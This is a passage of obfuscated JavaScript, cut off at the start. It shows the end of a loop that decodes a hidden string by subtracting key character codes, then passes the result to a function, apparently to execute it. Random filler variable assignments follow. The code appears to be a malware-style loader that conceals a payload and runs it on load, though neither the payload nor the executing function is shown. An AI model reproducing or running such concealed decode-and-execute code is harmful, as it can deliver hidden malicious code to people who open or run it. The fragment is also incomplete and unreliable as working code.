            var bcfhpq = kmrtw % celmnw.length + 1;
            var aekqwy = celmnw.substring(kmrtw % celmnw.length, bcfhpq);
            ekpu += aght(aejksy - aekqwy.charCodeAt(0));
        }
        befltu(ekpu);
    };
afitux();
lrvw = "lrvw";
efpx = false;
kvarlz = "kvarlz";
cdex = true;
ilpr = "ilpr";

